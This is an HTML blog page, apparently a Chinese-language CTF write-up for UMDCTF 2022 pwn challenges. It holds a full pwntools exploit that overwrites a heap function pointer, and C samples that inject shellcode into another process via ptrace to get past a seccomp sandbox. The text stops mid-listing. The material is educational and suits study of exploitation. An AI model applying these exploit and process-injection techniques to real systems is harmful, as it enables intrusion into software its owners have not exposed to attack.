@@ -1,0 +1,626 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="nich0las" />
+
+
+
+<meta name="description" content="umdctf2022-pwn 4 fun!">
+<meta property="og:type" content="article">
+<meta property="og:title" content="umdctf2022-pwn">
+<meta property="og:url" content="https://nicholas-wei.github.io/2022/03/07/umdctf2022-pwn/index.html">
+<meta property="og:site_name" content="welc0me">
+<meta property="og:description" content="umdctf2022-pwn 4 fun!">
+<meta property="og:locale">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220307140622856.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220307140818676.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220307140538701.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220307142650657.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220307142049366.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220307152016719.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220307160458834.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220307220550881.png">
+<meta property="og:image" content="https://nicholas-wei.github.io/.io//image-20220307222728045.png">
+<meta property="article:published_time" content="2022-03-07T06:04:05.000Z">
+<meta property="article:modified_time" content="2022-03-09T06:39:28.000Z">
+<meta property="article:author" content="nich0las">
+<meta property="article:tag" content="heap">
+<meta property="article:tag" content="stack">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://nicholas-wei.github.io/.io//image-20220307140622856.png">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="welc0me" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/favicon.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>umdctf2022-pwn | welc0me</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+    <script>
+        yiliaConfig.jquery_ui = [true, "//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
+    </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/avatar.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/"></a></h1>
+        </hgroup>
+
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="" />
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/DNS/" rel="tag">DNS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/FSOP/" rel="tag">FSOP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/IO-FILE/" rel="tag">IO_FILE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/VM/" rel="tag">VM</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/bash-jail/" rel="tag">bash_jail</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/botnet/" rel="tag">botnet</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/directed-fuzz/" rel="tag">directed_fuzz</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dp/" rel="tag">dp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/exit-hook/" rel="tag">exit_hook</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fb-bot/" rel="tag">fb-bot</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fmtstr/" rel="tag">fmtstr</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fuzz/" rel="tag">fuzz</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fuzzing101/" rel="tag">fuzzing101</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/graph/" rel="tag">graph</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hardware/" rel="tag">hardware</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/heap/" rel="tag">heap</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ics-pa/" rel="tag">ics-pa</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/int-overflow/" rel="tag">int_overflow</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/interpreter/" rel="tag">interpreter</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/kernel/" rel="tag">kernel</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/llvm/" rel="tag">llvm</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/matlab/" rel="tag">matlab</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/maze/" rel="tag">maze</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/meltdown/" rel="tag">meltdown</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwnable-tw/" rel="tag">pwnable.tw</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pyjail/" rel="tag">pyjail</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/race-condition/" rel="tag">race_condition</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ransomeware/" rel="tag">ransomeware</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/shellcode/" rel="tag">shellcode</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/software-security/" rel="tag">software-security</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/stack/" rel="tag">stack</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tcp/" rel="tag">tcp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tree/" rel="tag">tree</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wasm/" rel="tag">wasm</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wechat/" rel="tag">wechat</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://pages.github.com/">GitHub</a>
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="http://moxfive.xyz/">MOxFIVE</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">勤能补拙是良训</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页"></a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/avatar.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页"></a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-umdctf2022-pwn" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2022/03/07/umdctf2022-pwn/" class="article-date">
+      <time datetime="2022-03-07T06:04:05.000Z" itemprop="datePublished">2022-03-07</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      umdctf2022-pwn
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/pwn/">pwn</a>
+    </div>
+
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/heap/" rel="tag">heap</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/stack/" rel="tag">stack</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>umdctf2022-pwn 4 fun!</p>
+<span id="more"></span>
+
+<h1 id="the-show"><a href="#the-show" class="headerlink" title="the show"></a>the show</h1><h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>这个题也是有点恶心。一开始没发现还有个后门函数win，要不是在字符串里面看了一眼还找不到。</p>
+<p><img src="/.io//image-20220307140622856.png" alt="image-20220307140622856"></p>
+<p>在setup后面的程序主要工作也没看明白，其中包含了太多的加密函数，也不知道代码里面的code是干什么用的。倒是setup中存在比较明显的溢出漏洞和函数指针。(需要手动修一下里面挺多的函数)</p>
+<p><img src="/.io//image-20220307140818676.png" alt="image-20220307140818676"></p>
+<p>其实要是仔细分析一下发现漏洞也不难，主要是函数指针。观察到我们在mainAct里面储存了函数指针，大小为0x68，但是mainAct是在message1,2,3之后分配的，说明mainAct在message3后面。在后面我们又free掉了message3。但是在结束存在一个堆溢出，并且我们可以控制大小。<strong>我们只要将大小控制到message3，并且溢出修改mainAct的指针为win即可</strong>。</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">filename=<span class="string">&quot;./theshow&quot;</span></span><br><span class="line"><span class="comment"># io = process(filename)</span></span><br><span class="line">io = remote(<span class="string">&#x27;0.cloud.chals.io&#x27;</span>, <span class="number">30138</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf=ELF(filename)</span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split&#x27;</span>,<span class="string">&#x27;-hp&#x27;</span>,<span class="string">&#x27;60&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io,<span class="string">&quot;b *0x4012E6&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;What is the name of your act?&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;How long do you want the show description to be?&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;120&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Describe the show for us:&#x27;</span>)</span><br><span class="line"><span class="comment"># debug() // 找到偏移为0xf0</span></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x0000f0</span>+p64(elf.sym[<span class="string">&#x27;win&#x27;</span>])</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Action:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;1&#x27;</span>) <span class="comment"># 调用win函数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/.io//image-20220307140538701.png" alt="image-20220307140538701"></p>
+<h1 id="trace"><a href="#trace" class="headerlink" title="trace"></a>trace</h1><p>这道题不会做，看了<a target="_blank" rel="noopener" href="https://github.com/datajerk/ctf-write-ups/tree/master/umdctf2022/trace_story">wp</a>，了解到是关于ptrace的shellcode</p>
+<p>看一下保护开启情况。</p>
+<p><img src="/.io//image-20220307142650657.png" alt="image-20220307142650657"></p>
+<p>看到程序开启沙箱，但是没有发现orw？但是我们有gettimeofday和ptrace</p>
+<p><img src="/.io//image-20220307142049366.png" alt="image-20220307142049366"></p>
+<p>程序也很简单，就是读入shellcode之后执行。主要考察的就是只能利用ptrace时的shellcode。以前还从未碰到过，这次就当学习了。</p>
+<h2 id="ptrace是什么"><a href="#ptrace是什么" class="headerlink" title="ptrace是什么?"></a>ptrace是什么?</h2><p>参考<a target="_blank" rel="noopener" href="https://www.linuxjournal.com/article/6210">链接</a>。之前看《linux二进制分析》这本书的时候也有学到过，这次复习一下几个要点。</p>
+<p>主要参考以下代码，作用是可以设置断点。简要说明原理，是先通过attach上去，获取eip的值，先将其保存下来(20行)，再写入自己的code(22行)，之后继续运行(25行)。此时eip就会执行int80陷入内核，再int3陷入调试器。最后把原先的eip数值放回去，回复程序原先执行流程。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;   <span class="type">pid_t</span> traced_process;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span> <span class="title">regs</span>, <span class="title">newregs</span>;</span></span><br><span class="line">    <span class="type">long</span> ins;</span><br><span class="line">    <span class="comment">/* int 0x80, int3 */</span></span><br><span class="line">    <span class="type">char</span> code[] = &#123;<span class="number">0xcd</span>,<span class="number">0x80</span>,<span class="number">0xcc</span>,<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">char</span> backup[<span class="number">4</span>];</span><br><span class="line">    <span class="keyword">if</span>(argc != <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Usage: %s &lt;pid to be traced&gt;\n&quot;</span>,</span><br><span class="line">               argv[<span class="number">0</span>], argv[<span class="number">1</span>]);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    traced_process = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">    ptrace(PTRACE_ATTACH, traced_process,</span><br><span class="line">           <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    wait(<span class="literal">NULL</span>);</span><br><span class="line">    ptrace(PTRACE_GETREGS, traced_process,</span><br><span class="line">           <span class="literal">NULL</span>, &amp;regs);</span><br><span class="line">    <span class="comment">/* Copy instructions into a backup variable */</span></span><br><span class="line">    getdata(traced_process, regs.eip, backup, <span class="number">3</span>);</span><br><span class="line">    <span class="comment">/* Put the breakpoint */</span></span><br><span class="line">    putdata(traced_process, regs.eip, code, <span class="number">3</span>);</span><br><span class="line">    <span class="comment">/* Let the process continue and execute</span></span><br><span class="line"><span class="comment">       the int 3 instruction */</span></span><br><span class="line">    ptrace(PTRACE_CONT, traced_process, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    wait(<span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The process stopped, putting back &quot;</span></span><br><span class="line">           <span class="string">&quot;the original instructions\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Press &lt;enter&gt; to continue\n&quot;</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    putdata(traced_process, regs.eip, backup, <span class="number">3</span>);</span><br><span class="line">    <span class="comment">/* Setting the eip back to the original</span></span><br><span class="line"><span class="comment">       instruction to let the process continue */</span></span><br><span class="line">    ptrace(PTRACE_SETREGS, traced_process,</span><br><span class="line">           <span class="literal">NULL</span>, &amp;regs);</span><br><span class="line">    ptrace(PTRACE_DETACH, traced_process,</span><br><span class="line">           <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>用图片表示流程，如下所示。</p>
+<p><img src="/.io//image-20220307152016719.png" alt="image-20220307152016719"></p>
+<p>按照以上方法，我们成功向<strong>用户代码段插入了一行指令：陷入调试器。那么我们是不是还可以做得更多，例如插入任意代码呢？答案是可以的</strong>。只需要用完全一致的方法，通过内联汇编写好shellcode，编译获得字节码，用完全一致的方法插入到eip中即可。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;   <span class="type">pid_t</span> traced_process;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span> <span class="title">regs</span>, <span class="title">newregs</span>;</span></span><br><span class="line">    <span class="type">long</span> ins;</span><br><span class="line">    <span class="type">int</span> len = <span class="number">41</span>;</span><br><span class="line">    <span class="comment">// 这一段insertcode是调用输出hello world的内联汇编通过x/20bx main看出的</span></span><br><span class="line">    <span class="type">char</span> insertcode[] =</span><br><span class="line"><span class="string">&quot;\xeb\x15\x5e\xb8\x04\x00&quot;</span></span><br><span class="line">        <span class="string">&quot;\x00\x00\xbb\x02\x00\x00\x00\x89\xf1\xba&quot;</span></span><br><span class="line">        <span class="string">&quot;\x0c\x00\x00\x00\xcd\x80\xcc\xe8\xe6\xff&quot;</span></span><br><span class="line">        <span class="string">&quot;\xff\xff\x48\x65\x6c\x6c\x6f\x20\x57\x6f&quot;</span></span><br><span class="line">        <span class="string">&quot;\x72\x6c\x64\x0a\x00&quot;</span>;</span><br><span class="line">    <span class="type">char</span> backup[len];</span><br><span class="line">    <span class="keyword">if</span>(argc != <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Usage: %s &lt;pid to be traced&gt;\n&quot;</span>,</span><br><span class="line">               argv[<span class="number">0</span>], argv[<span class="number">1</span>]);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    traced_process = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">    ptrace(PTRACE_ATTACH, traced_process,</span><br><span class="line">           <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    wait(<span class="literal">NULL</span>);</span><br><span class="line">    ptrace(PTRACE_GETREGS, traced_process,</span><br><span class="line">           <span class="literal">NULL</span>, &amp;regs);</span><br><span class="line">    getdata(traced_process, regs.eip, backup, len);</span><br><span class="line">    putdata(traced_process, regs.eip,</span><br><span class="line">            insertcode, len);</span><br><span class="line">    ptrace(PTRACE_SETREGS, traced_process,</span><br><span class="line">           <span class="literal">NULL</span>, &amp;regs);</span><br><span class="line">    ptrace(PTRACE_CONT, traced_process,</span><br><span class="line">           <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    wait(<span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The process stopped, Putting back &quot;</span></span><br><span class="line">           <span class="string">&quot;the original instructions\n&quot;</span>);</span><br><span class="line">    putdata(traced_process, regs.eip, backup, len);</span><br><span class="line">    ptrace(PTRACE_SETREGS, traced_process,</span><br><span class="line">           <span class="literal">NULL</span>, &amp;regs);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Letting it continue with &quot;</span></span><br><span class="line">           <span class="string">&quot;original flow\n&quot;</span>);</span><br><span class="line">    ptrace(PTRACE_DETACH, traced_process,</span><br><span class="line">           <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="ptrace利用1——poc-orw"><a href="#ptrace利用1——poc-orw" class="headerlink" title="ptrace利用1——poc(orw)"></a>ptrace利用1——poc(orw)</h2><p>从上面我们可以想到一种思路: 利用ptrace尝试patch子进程执行流，修改read函数中目标文件为flag.txt，之后使用程序自带的puts输出即可。</p>
+<p><img src="/.io//image-20220307160458834.png" alt="image-20220307160458834"></p>
+<p>这里是原先的汇编代码。可以看到puts这里只能输出”Didn’t read anything.”我们尝试把他patch掉。由于read之后的buffer在rsi中。我们想办法通过<code>mov rdi,rsi</code>之后调用puts就能输出buf内容。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004017E6 loc_4017E6:                             ; CODE XREF: read_story+64↑j</span><br><span class="line">.text:00000000004017E6                 lea     rcx, [rbp+buf]</span><br><span class="line">.text:00000000004017ED                 mov     eax, [rbp+fd]</span><br><span class="line">.text:00000000004017F3                 mov     edx, 1000h      ; nbytes</span><br><span class="line">.text:00000000004017F8                 mov     rsi, rcx        ; buf</span><br><span class="line">.text:00000000004017FB                 mov     edi, eax        ; fd</span><br><span class="line">.text:00000000004017FD                 call    _read</span><br><span class="line">.text:0000000000401802                 mov     [rbp+var_1018], rax</span><br><span class="line">.text:0000000000401809                 cmp     [rbp+var_1018], 0</span><br><span class="line">.text:0000000000401811                 jnz     short loc_401831</span><br><span class="line">.text:0000000000401813                 mov     eax, cs:debug</span><br><span class="line">.text:0000000000401819                 test    eax, eax</span><br><span class="line">.text:000000000040181B                 jz      short loc_401827</span><br><span class="line">.text:000000000040181D                 mov     edi, offset aDidnTReadAnyth ; &quot;Didn&#x27;t read anything.&quot;</span><br><span class="line">.text:0000000000401822                 call    _puts</span><br></pre></td></tr></table></figure>
+
+<p>修改成如下所示</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">4017fd:   e8 de f9 ff ff          call   4011e0 &lt;read@plt&gt;</span><br><span class="line">                                  nop</span><br><span class="line">                                  nop</span><br><span class="line">                                  ...</span><br><span class="line">                                  mov    rdi, rsi</span><br><span class="line">401822:   e8 49 f9 ff ff          call   401170 &lt;puts@plt&gt;</span><br></pre></td></tr></table></figure>
+
+<p>尝试编写一个poc验证一下。(我没有自己写，直接复制的网上的，大致明白了流程)。可以看到大致是ptrace上一个进程，修改txt所在地址为flag.txt。</p>
+<p><img src="/.io//image-20220307220550881.png" alt="image-20220307220550881"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span 